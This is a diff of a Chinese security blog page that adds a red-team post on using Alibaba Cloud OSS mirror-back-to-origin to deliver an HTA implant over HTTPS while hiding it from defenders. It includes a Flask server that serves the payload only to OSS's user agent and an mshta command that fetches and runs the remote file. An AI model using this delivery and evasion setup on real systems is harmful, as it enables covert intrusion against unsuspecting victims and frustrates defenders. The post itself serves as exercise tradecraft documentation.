@@ -233,6 +233,154 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/23/巧用OSS对抗记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/11/23/巧用OSS对抗记/" itemprop="url">巧用OSS对抗记</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-23T22:55:20+08:00">
+                2020-11-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="巧用OSS对抗记"><a href="#巧用OSS对抗记" class="headerlink" title="巧用OSS对抗记"></a>巧用OSS对抗记</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>在某次红蓝对抗中，发现自己的小马被防守方获取到，由此开始想招对抗防守方。主要场景是我使用mshta <a href="http://x.x.x.x/123.hta进行远程命令执行，但是由于环境所困没办法使用https，害怕由于使用https出现&quot;此网站的安全证书存在问题&quot;，需要受害者二次点击影响效果。" target="_blank" rel="noopener">http://x.x.x.x/123.hta进行远程命令执行，但是由于环境所困没办法使用https，害怕由于使用https出现&quot;此网站的安全证书存在问题&quot;，需要受害者二次点击影响效果。</a></p>
+<p>后续对风险面分析，我的小马会释放一个hta到本地，然后在mshta本地hta，为什么要这样做？缘由是这样的，如果通过mshta直接进行远程文件的下载是会出现<strong>跨域同源策略</strong>的问题，当然通过命令下载(bitsadmin、certutil···等等)，也是为了避免去使用命令下载才使用编写XMLHTTP Request进行下载。所以我通过scripting.filesystemobject又写了一个hta到本地，继续mshta本地hta文件，这样就可以把上述问题解决。我也期待有其他解决方案，希望大家可以一起交流 :-)</p>
+<p>回到重点，想在网络上将隐藏的好一些，那么如何能不弹”此网站的安全证书存在问题”?后来大佬说OSS可以，然后我就去对OSS进行了解，发现<strong>镜像回源</strong>的功能可以实现，当然直接文件丢OSS任何人都可以下载，最终利用该功能配合脚本解决。</p>
+<p>这里的OSS指的是阿里云-对象存储OSS</p>
+<h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>OSS 镜像回源的功能主要为两种模式：</p>
+<blockquote>
+<h3 id="404"><a href="#404" class="headerlink" title="404"></a>404</h3><p>当客户请求到 OSS 获取资源时，如果 OSS 资源不存在，那么会根据客户配置的镜像回源地址去拉去对应的资源，如果真正的源站有数据就会响应 OSS 200 ，OSS 会将文件一同存储到本地，并且透传给客户端 200 的状态码。</p>
+<p>在这个过程中，如果 OSS 回源没有回去到资源，源站响应了 404 ，那么 OSS 也直接将 404 透传给用户。</p>
+<p>如果 OSS 回源获取资源失败，源站返回了一个非 200 404 的状态码，比如 502，那 OSS 会记录 424 ，然后透传给源站的状态码 502 给客户端。</p>
+<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>回源另外一个功能就是重定向，重定向，分为 301 、302、307。常用的就是 302 301，配置重定向功能后，客户端请求到 bucket A 后，会直接 302 301 到用户配置的 bucket B，客户端直接根据 301 302 follow 到目的 bucket B。</p>
+</blockquote>
+<p><strong>简单理解的话，其实OSS就是中间人，用户访问A文件，如果OSS没有A文件就去源站拉A文件并存在OSS返回给用户，如果有A文件则直接返回</strong></p>
+<p><strong>OSS支持HTTP和HTTPS</strong></p>
+<p>利用该功能特性，我们就借助OSS完成SSL进行文件的传输，OSS还有伪装的好处，一般OSS不会太引起疑心。</p>
+<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>OSS控制台-&gt;选择某Bucket-&gt;基础设置-&gt;镜像回源-&gt;创建规则</p>
+<p><img src="/2020/11/23/巧用OSS对抗记/1.png" alt="img"></p>
+<p><img src="/2020/11/23/巧用OSS对抗记/2.png" alt="img"></p>
+<p>通过访问xxxxx.oss-cn-shenzhen.aliyuncs.com/xxxxx.jpg，会去回源地址进行拉取</p>
+<p>通过开个http服务，看日志，发现来进行请求</p>
+<p>x.x.x.x - - [23/Nov/2020 23:55:01] “GET /1.hta/xxxxx.jpg HTTP/1.1” 404 -</p>
+<p>通过路由规则匹配/1.hta/xxxxx.jpg，然后返回给OSS相应的hta文件内容，会将xxxxx.jpg存储在OSS</p>
+<p>这样的话就出现一个风险，就是任何人都可以下载，因为我们是需要公有读权限，后面我们配合OSS API进行定时的文件删除，这样就可以解决</p>
+<p>后面又发现一个风险点，就是任何人都可以对我源站文件进行下载，这里通过判断UA头来进行控制，OSS的UA头为：aliyun-oss-mirror，那么我们以此做判断就可以了，其他UA头过来我们全部ban掉</p>
+<p>附代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/1.hta/xxxxx.jpg',method=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">'aliyun-oss-mirror'</span> <span class="keyword">in</span> request.user_agent.string:</span><br><span class="line">		<span class="keyword">return</span> send_from_directory(<span class="string">'download'</span>,<span class="string">'1.hta'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Oooooo..."</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta https://xxxxx.oss-cn-shenzhen.aliyuncs.com/xxxxx.jpg</span><br></pre></td></tr></table></figure>
+<p>这样我们就巧用OSS进行一次网络流量方面的对抗 :-)</p>
+<p>最后期待学习下mshta远程下载文件的时候，除了上述解决方法还有什么，期待有缘人讨论 :-)</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/30/HW红队攻击方案/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1421,143 +1569,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/24/windows降权记录/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="YoungRichOG">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="YoungRichOG">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/09/24/windows降权记录/" itemprop="url">windows降权记录</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-24T23:52:58+08:00">
-                2019-09-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="windows降权记录"><a href="#windows降权记录" class="headerlink" title="windows降权记录"></a>windows降权记录</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
-<p>降权模式:</p>
-<ul>
-<li>SYSTEM -&gt; 普通用户</li>
-<li>用户A -&gt; 用户B</li>
-</ul>
-<p>一种是SYSTEM降权至普通用户，另外一种是用户A使用用户B身份</p>
-<p>降权方式:</p>
-<ol>
-<li>令牌窃取</li>
-<li>模拟用户</li>
-<li>切会话</li>
-<li>进程迁移/进程注入</li>
-</ol>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/09/24/windows降权记录/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1608,7 +1619,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1621,7 +1632,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
